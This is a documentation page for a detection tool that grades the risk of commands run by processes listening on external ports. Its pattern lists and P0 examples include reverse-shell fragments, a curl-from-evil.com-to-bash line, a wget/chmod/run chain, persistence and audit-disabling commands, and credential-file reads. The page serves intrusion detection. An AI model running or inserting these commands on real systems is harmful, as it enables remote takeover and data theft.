# External Listener Command Risk Pattern Reference

**Languages:** English (this page) | [简体中文](23-external-listener-command-risk.zh-CN.md)

> SecWeaver risk pattern reference\
> Applicable data: `exec` command execution events from processes listening on external ports (auditd / audit-port-execmon output)  
> Purpose: explain command risk signals; use risk-identification for execution and final decisions\
> Agent Skill: `src/skills/external-listener-cmd-risk/SKILL.md`

---

**Reading by task:** Jump to the relevant section; reading every section in order is optional.

- [2. Severity Levels](#2-severity-levels)
- [3. High-Risk Command Patterns](#3-high-risk-command-patterns)
- [7. Execution and Review](#7-execution-and-review)

Use this article to understand risk patterns and investigation examples. The [rule packs](../src/skills/risk-identification/rules/) and [operations handbook](../src/skills/risk-identification/OPS-HANDBOOK.md) define current executable rules and policy.

## 1. Identification Principles

### 1.1 First Ask: Should This Process Execute Commands?

For external Web/API service processes, normal behavior is typically:

- Listening on ports
- Handling requests
- Reading/writing business files
- Connecting to databases/caches

**Should not appear:**

- Starting a shell
- Downloading files from the internet
- Compiling/packaging
- Changing system configuration
- Privilege escalation
- Internal network probing

Identification has two layers:

```text
Layer 1: Did this process execute a command? (anomaly itself)
Layer 2: What command was executed? (severity grading)
```

### 1.2 Context Weighting

The same command can change severity based on context:

| Context | Impact |
|---|---|
| Web process listening on 443 | Higher weight |
| Listening on 22 and already whitelisted | Can be downgraded |
| Command from php-fpm/nginx child process | High risk |
| Command args contain `http://`, base64, pipe chains | High risk |
| Working directory in `/tmp`, `/dev/shm` | High risk |
| File path contains `upload`, `www` | High WebShell suspicion |

---

## 2. Severity Levels

The table explains final severity levels. The following sections group risk patterns, not guaranteed command grades. Final decisions pass through JSON detection, behavior policy and the environment whitelist:

| Level | Meaning | Recommended action |
|---|---|---|
| **P0 Critical** | Clear attack/backdoor behavior | Alert immediately, isolate host |
| **P1 High** | Highly suspicious, very likely intrusion | Human confirmation within 5 minutes |
| **P2 Medium** | Anomalous but needs context | Automated triage + observe |
| **P3 Low** | Possible false positive or ops activity | Log, aggregate, noise reduction |

---

## 3. High-Risk Command Patterns

### 3.1 Shell / Interpreter Execution

```text
/bin/sh
/bin/bash
/bin/dash
/bin/zsh
/bin/ksh
/usr/bin/python
/usr/bin/python3
/usr/bin/perl
/usr/bin/ruby
/usr/bin/node
/usr/bin/php
```

**Context to examine:**

- Port-listening process directly execs
- Or its child process execs
- And parent is nginx / php-fpm / java / tomcat / node

**Typical attacks:**

- WebShell command execution
- Reverse shell
- Download and run scripts

---

### 3.2 Reverse Shell / Remote Control

```text
bash -i
sh -i
/bin/bash -c
/bin/sh -c
exec bash
exec sh
mkfifo
nc -e
nc -c
ncat -e
socat exec
python -c 'import socket'
perl -e 'use Socket'
ruby -socket
php -r 'fsockopen'
```

**High-risk parameter patterns:**

```text
/dev/tcp/
/dev/udp/
>& /dev/tcp/
0>&1
2>&1
/bin/sh -i
bash -i >&
```

---

### 3.3 Download and Execute

```text
curl
wget
fetch
aria2c
axel
lwp-download
python -m urllib
powershell
certutil
bitsadmin
```

**High-risk combinations:**

```text
curl http*
curl https*
curl -O
curl -o
wget http*
wget -O
curl | sh
wget | bash
curl | python
wget | php
```

**P0 examples:**

```bash
curl http://evil.com/shell.sh | bash
wget -O /tmp/x http://1.2.3.4/a && chmod +x /tmp/x && /tmp/x
```

---

### 3.4 Privilege Escalation / Exploit Tools

```text
sudo
su
pkexec
doas
gpasswd
passwd root
chattr -i
setcap
capsh
newgrp
runuser
```

**Privilege escalation exploit tools:**

```text
linpeas
linenum
linux-exploit-suggester
dirtycow
overlayfs
cve-2021-4034
pwnkit
```

---

### 3.5 Persistence / Backdoor Installation

```text
crontab
systemctl enable
systemctl start
update-rc.d
chkconfig
rc.local
authorized_keys
ssh-keygen
useradd
adduser
usermod -aG
echo >> /etc/passwd
echo >> /etc/shadow
echo >> ~/.ssh/authorized_keys
```

**High-risk paths:**

```text
/etc/cron*
/etc/systemd/system/
~/.ssh/authorized_keys
/etc/rc.local
/etc/profile
/etc/bashrc
```

---

### 3.6 Firewall / Security Policy Tampering

```text
iptables -F
iptables -X
iptables -P INPUT ACCEPT
ufw disable
firewall-cmd --reload
setenforce 0
auditctl -D
service auditd stop
systemctl stop auditd
systemctl disable auditd
```

---

## 4. Commands Requiring Close Review

### 4.1 Information Gathering / Internal Probing

```text
whoami
id
uname -a
hostname
ifconfig
ip addr
ip route
netstat
ss -lntp
ps aux
ps -ef
cat /etc/passwd
cat /etc/shadow
cat /etc/hosts
cat /proc/version
cat /proc/cpuinfo
env
printenv
ls -la /
find / -writable
find / -perm -4000
locate passwd
```

**Internal scanning:**

```text
nmap
masscan
fping
arp-scan
ping -c
traceroute
dig
nslookup
host
```

---

### 4.2 Outbound Transfer / Proxy Tools

```text
nc
ncat
netcat
socat
ssh
scp
sftp
rsync
ftp
telnet
proxychains
tsocks
```

**High-risk parameters:**

```text
ssh root@
scp *@
rsync -e ssh
-L 8080:
-R 4444:
```

---

### 4.3 Encoding / Evasion

```text
base64 -d
base64 --decode
xxd -r
openssl enc
printf \x
echo -e
python -c
perl -e
php -r
eval(
exec(
system(
passthru(
shell_exec(
```

**High-risk patterns:**

```text
base64 -d | bash
echo xxx | base64 -d | sh
python -c "import os; os.system(...)"
php -r "system(...)"
```

---

### 4.4 File Write / WebShell Drop

```text
echo >
echo >>
tee
cat >
cat >>
cp
mv
install
touch
mkdir
```

**High-risk paths:**

```text
/var/www/
/usr/share/nginx/
/home/*/public_html/
/tmp/
/dev/shm/
/upload/
/shell.php
/.php
/.jsp
/.asp
/.aspx
/.phtml
/.htaccess
```

**High-risk filenames:**

```text
shell
webshell
cmd
backdoor
c99
r57
b374k
phpinfo
```

---

### 4.5 Compile / Package / Run Binaries

```text
gcc
g++
make
cmake
go build
javac
python setup.py
chmod +x
./
exec ./
```

When a Web process compiles or `chmod +x` then executes a binary, it is typically a backdoor or cryptominer drop.

---

## 5. Ordinary Commands Requiring Context

### 5.1 Routine System Administration Commands

```text
ls
cat
head
tail
grep
awk
sed
cut
sort
wc
pwd
cd
date
uptime
free
df
du
top
htop
```

**Escalation conditions:**

- Reading sensitive files: `/etc/passwd`, `/etc/shadow`, `.env`, `config.php`
- Reading keys: `.pem`, `.key`, `id_rsa`
- Executing in upload directory

---

### 5.2 Archive / Package / Transfer Prep

```text
tar
zip
gzip
gunzip
7z
rar
```

**Escalation conditions:**

- Archiving `/var/www`, `/home`, database directories
- Output to `/tmp`, `/dev/shm`

---

### 5.3 Database Clients

```text
mysql
mysqldump
psql
pg_dump
redis-cli
mongo
mongosh
sqlite3
```

**Escalation conditions:**

- Web process invokes directly
- Contains `dump`, `select *`, `into outfile`

---

## 6. Candidates for Scoped Noise Reduction

These commands are not necessarily malicious on their own, but are still anomalous in a Web process:

```text
which
whereis
file
stat
md5sum
sha1sum
sha256sum
base64
curl --version
wget --version
```

**Handling recommendations:**

- Policy and environment-scoped whitelist rules determine suppression/downgrades; a tool name alone is not an allowlist.
- Retain evidence when high-risk behavior is correlated and let the parent engine reassess.

---

## 7. Execution and Review

Runtime rules live in `risk-identification/rules/*.json`. The command patterns here are not importable configuration; this article does not define a separate YAML execution path.

Run the offline fixture from the repository root:

```bash
python3 src/skills/risk-identification/scripts/assess.py \
  -i examples/risk-identification/s5-curl-download-exec-p0.json \
  -o /tmp/secweaver-command-risk.json
```

Read final `risk_items[]` fields `severity`, `matched_rules`, `policy_rule_id` and `recommended_action`, alongside evidence and gaps. No detection match does not mean no alert: default rules yield P1/manual review for nginx → ls. See the [complete reproducible examples](../src/skills/external-listener-cmd-risk/examples.md).

Use the [rule pack reference](../src/skills/risk-identification/rules/README.md) for rule changes and the [operations handbook](../src/skills/risk-identification/OPS-HANDBOOK.md) for policy and noise reduction. Command risk does not establish per-alert attack success; use [traceability](18-traceability-analysis.md) for cross-source chains. Egress, DNS and scp signals alone do not prove exfiltration.
